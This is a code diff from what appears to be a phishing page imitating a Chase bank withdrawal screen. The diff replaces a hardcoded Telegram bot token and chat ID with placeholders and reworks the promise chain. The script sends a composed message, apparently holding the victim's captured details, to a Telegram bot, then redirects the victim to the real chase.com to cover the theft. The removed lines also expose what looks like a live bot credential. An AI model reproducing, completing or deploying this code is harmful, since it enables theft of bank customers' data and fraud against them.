@@ -391,36 +391,32 @@
                 console.log('Withdrawal successful! Email sent.');
 
                 // Send message to Telegram bot
-                fetch(`https://api.telegram.org/7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0/sendMessage`, {
+                return fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        chat_id: '7959877182',
+                        chat_id: 'YOUR_CHAT_ID',
                         text: telegramMessage
                     })
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('Notification sent to Telegram!');
-                        showToast('Withdrawal successful! Email sent.'); // Show success toast
-                        closeBottomSheet(); // Hide bottom sheet
-                        
-                        // Redirect to chase.com after modal is closed
-                        setTimeout(() => {
-                            window.location.href = 'https://www.chase.com'; // Redirect to Chase
-                        }, 500); // Delay to ensure the modal closes smoothly
-                    } else {
-                        console.error('Error sending message to Telegram.');
-                        showToast('Error sending notification to Telegram.', true); // Show error toast
-                    }
-                }).catch(err => {
-                    console.error('Error: ' + err);
-                    showToast('Error sending notification to Telegram.', true); // Show error toast
                 });
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Notification sent to Telegram!');
+                    showToast('Withdrawal successful! Email sent.'); // Show success toast
+                    closeBottomSheet(); // Hide bottom sheet
+                    
+                    // Redirect to chase.com after modal is closed
+                    setTimeout(() => {
+                        window.location.href = 'https://www.chase.com'; // Redirect to Chase
+                    }, 500); // Delay to ensure the modal closes smoothly
+                } else {
+                    throw new Error('Error sending message to Telegram.');
+                }
             }).catch(err => {
-                console.error('Error sending email: ' + err);
-                showToast('Error sending email.', true); // Show error toast
+                console.error('Error: ' + err);
+                showToast('Error sending notification.', true); // Show error toast
             });
         }
 
@@ -435,5 +431,4 @@
     </script>
 </body>
 
-    </html>
-    
+</html>
